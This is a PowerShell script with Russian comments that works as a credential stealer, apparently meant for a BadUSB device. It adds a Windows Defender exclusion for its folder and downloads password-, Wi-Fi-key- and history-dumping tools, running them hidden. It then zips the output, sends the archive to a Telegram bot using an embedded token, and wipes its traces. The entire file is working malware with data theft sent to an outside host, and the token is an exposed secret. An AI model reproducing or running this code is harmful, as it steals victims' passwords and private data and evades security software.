$basePath = "C:\Users\Public\Documents\scripts"
$dumpFolder = "$basePath\Report"
$dumpFile = "$basePath\data.zip"

# 1. Подготовка папок
if (Test-Path $basePath) { Remove-Item -Recurse -Force $basePath -ErrorAction SilentlyContinue }
New-Item -ItemType Directory -Path $dumpFolder -Force | Out-Null
Set-Location $basePath

# 2. Пытаемся добавить в исключения (игнорируя ошибку, если дефендер выключен)
try { Add-MpPreference -ExclusionPath $basePath -Force -ErrorAction SilentlyContinue } catch {}

# 3. Функция для безопасного скачивания и запуска
function Download-And-Run($url, $name, $args) {
    try {
        $path = "$basePath\$name"
        Invoke-WebRequest -Uri $url -OutFile $path -ErrorAction SilentlyContinue
        if (Test-Path $path) {
            Unblock-File $path
            # Запуск через Start-Process, чтобы избежать ошибок консоли
            Start-Process -FilePath $path -ArgumentList $args -WindowStyle Hidden -Wait
            Remove-Item $path -Force -ErrorAction SilentlyContinue # Удаляем exe сразу после работы
        }
    } catch {}
}

# 4. Ссылки
$myRepo = "https://raw.githubusercontent.com/whetherit/tools/main"
$origRepo = "https://raw.githubusercontent.com/tuconnaisyouknow/BadUSB_passStealer/main/other_files"

# 5. Сбор данных по очереди
Download-And-Run "$myRepo/WebBrowserPassView.exe" "WebBrowserPassView.exe" "/stext passwords.txt"
Download-And-Run "$origRepo/WirelessKeyView.exe" "WirelessKeyView.exe" "/stext wifi.txt"
Download-And-Run "$origRepo/BrowsingHistoryView.exe" "BrowsingHistoryView.exe" "/VisitTimeFilterType 3 7 /stext history.txt"
Download-And-Run "$origRepo/WNetWatcher.exe" "WNetWatcher.exe" "/stext connected_devices.txt"

Start-Sleep -Seconds 2

# 6. Упаковка только текстовых отчетов
$txtFiles = Get-ChildItem -Path $basePath -Filter "*.txt"
if ($txtFiles) {
    Move-Item $txtFiles -Destination $dumpFolder -Force -ErrorAction SilentlyContinue
    Compress-Archive -Path "$dumpFolder\*" -DestinationPath $dumpFile -Force
}

# 7. Отправка в Telegram
$token = "8453011015:AAFvYt0ZjgkUFAjtnLvONdmXl19l7GK9tfM"
$chatID = "806761221"
if (Test-Path $dumpFile) {
    & curl.exe -F "chat_id=$chatID" -F "document=@$dumpFile" "https://api.telegram.org/bot$token/sendDocument"
}

# 8. Очистка
Set-Location "C:\Users\Public"
Remove-Item -Recurse -Force $basePath -ErrorAction SilentlyContinue
